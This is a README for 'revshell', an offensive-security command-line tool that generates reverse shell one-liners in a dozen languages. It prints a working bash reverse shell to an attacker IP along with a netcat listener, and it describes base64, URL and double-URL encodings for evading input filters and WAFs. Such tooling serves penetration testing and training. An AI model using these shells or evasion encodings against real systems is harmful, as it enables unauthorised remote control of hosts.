# >_ revshell

**Reverse shell generator CLI — generate one-liners in 12+ languages from your terminal.**

Part of [OffSecKit](https://offseckit.com) | [Browser version](https://offseckit.com/tools/revshell)

## Install

```bash
pip install offseckit-revshell
```

Or clone and install locally:

```bash
git clone https://github.com/offseckit/revshell.git
cd revshell
pip install .
```

## Quick Start

```bash
# Generate a bash reverse shell
revshell -i 10.10.10.10 -p 4444

# Output:
# >_ revshell v0.1.0
#    offseckit.com/tools/revshell
#
# # Bash -i
# bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
#
# # Listener
# nc -lvnp 4444
```

## Usage

```
revshell [OPTIONS] [COMMAND]
```

### Options

| Flag | Description | Default |
|------|-------------|---------|
| `-i, --ip` | Attacker IP address | (required) |
| `-p, --port` | Attacker port | `4444` |
| `-l, --lang` | Language | `bash` |
| `-v, --variant` | Specific variant | first available |
| `-e, --encoding` | Encoding: `raw`, `base64`, `url`, `double-url` | `raw` |
| `--all` | Show all variants for the language | — |
| `--no-listener` | Hide the listener command | — |
| `--help` | Show help | — |

### Commands

| Command | Description |
|---------|-------------|
| `list` | List all available languages and variants |

## Examples

```bash
# Python reverse shell
revshell -i 10.10.10.10 -l python

# PowerShell reverse shell
revshell -i 10.10.10.10 -l powershell

# Netcat with mkfifo (when nc -e isn't available)
revshell -i 10.10.10.10 -l netcat -v nc-mkfifo

# Base64 encoded for filter evasion
revshell -i 10.10.10.10 -l bash -e base64

# URL encoded for command injection via HTTP
revshell -i 10.10.10.10 -l python -e url

# Double URL encoded to bypass single-decode WAFs
revshell -i 10.10.10.10 -l php -e double-url

# Show all PHP variants at once
revshell -i 10.10.10.10 -l php --all

# Generate without showing the listener command
revshell -i 10.10.10.10 -l bash --no-listener

# List all supported languages and variants
revshell list
```

## Supported Languages

| Language | Variants | Notes |
|----------|----------|-------|
| **Bash** | `bash-i`, `bash-196`, `bash-udp`, `bash-readline`, `bash-5` | Uses `/dev/tcp` — most Linux systems |
| **Python** | `python3-short`, `python3-1`, `python3-2`, `python2` | `pty.spawn` for interactive TTY |
| **PowerShell** | `powershell-1` | Windows targets, no extra tools needed |
| **PHP** | `php-exec`, `php-shell-exec`, `php-popen` | Web app exploitation |
| **Ruby** | `ruby-1` | — |
| **Perl** | `perl-1` | — |
| **Netcat** | `nc-e`, `nc-c`, `nc-mkfifo`, `ncat` | `nc-mkfifo` works when `-e` is unavailable |
| **Socat** | `socat-1` | Encrypted/advanced shells |
| **Java** | `java-runtime` | — |
| **Lua** | `lua-1` | — |
| **Node.js** | `node-1`, `node-2` | — |
| **Groovy** | `groovy-1` | — |

## Encoding Options

| Encoding | Use Case |
|----------|----------|
| `raw` | Direct execution (default) |
| `base64` | Bypass input filters that block special characters |
| `url` | Command injection via URL parameters or HTTP requests |
| `double-url` | Bypass WAFs that URL-decode once before filtering |

## Requirements

- Python 3.8+
- No external dependencies beyond `click`

## Related

- [OffSecKit](https://offseckit.com) — Free browser-based security toolkit
- [Browser version](https://offseckit.com/tools/revshell) — Use revshell in your browser with a visual UI
- [Reverse Shell Cheat Sheet](https://offseckit.com/blog/reverse-shell-cheat-sheet) — Full guide with explanations

## License

MIT
